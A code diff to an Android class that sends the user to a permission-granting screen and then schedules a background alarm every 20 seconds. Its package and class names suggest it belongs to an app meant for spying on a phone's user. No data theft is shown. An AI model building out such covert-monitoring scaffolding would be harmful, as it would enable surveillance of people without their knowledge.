@@ -5,6 +5,7 @@ import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import com.gameofcoding.spy.receivers.SnopperAlarm;
+import com.gameofcoding.spy.activities.SnopperStarterActivity;
 import com.gameofcoding.spy.utils.XLog;
 
 public class SnopperStarter {
@@ -21,6 +22,13 @@ public class SnopperStarter {
 	    XLog.e(TAG, "start(): Could not start alarm as passed 'Context' is null.");
 	    return;
 	}
+
+	if(!hasAllPermissions()) {
+	    XLog.d(TAG, "start(): Starting 'SnopperStarterActivity' to grant all permissions."); 
+	    mContext.startActivity(new Intent(mContext, SnopperStarterActivity.class));
+	    return;
+	}
+	
         Intent intent = new Intent(mContext, SnopperAlarm.class);
 
 	// Check if alarm is already running
@@ -38,5 +46,10 @@ public class SnopperStarter {
         AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
         am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
 			1000 * 20, pendingIntent);
+    }
+
+    public boolean hasAllPermissions() {
+	// Code of this method will be in another branch
+	return true;
     }
 }
